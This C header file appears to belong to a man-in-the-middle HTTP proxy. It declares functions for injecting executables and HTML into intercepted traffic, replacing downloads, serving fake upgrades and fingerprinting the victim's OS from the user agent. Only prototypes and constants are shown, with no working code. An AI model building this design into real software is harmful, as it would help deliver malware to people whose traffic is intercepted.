
/* $Id: proxy.h 2993 2010-10-07 09:41:05Z alor $ */

#ifndef __PROXY_H
#define __PROXY_H

#include <openssl/bio.h>

#define PROXY_PORT "80"

#define CR "\r"
#define LF "\n"
#define HTTP_HOST_TAG               "Host: "
#define HTTP_ACCEPT_ENCODING_TAG    "Accept-Encoding: "
#define HTTP_CONNECTION_TAG         "Connection: "
#define HTTP_RANGE_TAG              "Range: "
#define HTTP_CONTENT_LENGTH_TAG     "Content-Length: "
#define HTTP_IF_NONE_MATCH_TAG      "If-None-Match: "
#define HTTP_IF_MODIFIED_SINCE_TAG  "If-Modified-Since: "

#define HTTP10_200_OK "HTTP/1.0 200 OK"
#define HTTP11_200_OK "HTTP/1.1 200 OK"

#define HTTP_HEADER_LEN  4096
#define READ_BUFF_SIZE  16384

/* protos */
typedef enum osuser { WINDOWS = 0, OSX, ANDROID, LINUX, UNKNOWN } osuser;

extern osuser search_useragent_os(char *request);
extern int search_useragent_browser(char *request);
extern void proxy_start(void);
extern int proxy_inject_exe(BIO **cbio, BIO **sbio, char *header, char *file, char *host, char *ip, char *url);
extern int proxy_inject_html(BIO **cbio, BIO **sbio, char *header, char *file, char *tag, char *host, char *ip, char *url);
extern int proxy_inject_html_file(BIO **cbio, BIO **sbio, char *header, char *file, char *tag, char *host, char *ip, char *url);
extern int proxy_null(BIO **cbio, BIO **sbio, char *header);
extern int proxy_replace(BIO **cbio, BIO **sbio, char *file, char *tag, int type, char *host, char *ip, char *url);
extern int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file, char *tag, char *host, char *ip, char *url);
extern int remote_BIOseek(const char *host, const char *resource, size_t offset, BIO **sbio, char *header);

extern void sanitize_header(char *header);

#endif

/* EOF */

// vim:ts=3:expandtab

